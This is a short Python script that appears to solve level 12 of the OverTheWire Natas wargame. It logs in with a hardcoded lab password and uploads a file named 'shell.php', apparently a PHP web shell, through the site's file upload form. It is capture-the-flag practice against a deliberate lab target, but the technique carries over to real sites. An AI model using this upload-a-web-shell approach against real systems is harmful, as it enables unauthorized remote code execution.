import requests as req
import re



username="natas12"
password='yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB'

url="http://%s.natas.labs.overthewire.org/" % username
file_path="shell.php"

s=req.Session()
response=s.post(url,auth=(username,password))

with open(file_path,'rb') as f:
    files = {'uploadedfile': (file_path, f)}
    data = {'filename': file_path, 
            'submit': 'Upload'}
    response = s.post(url, auth=(username, password), files=files, data=data)

print(response.text)



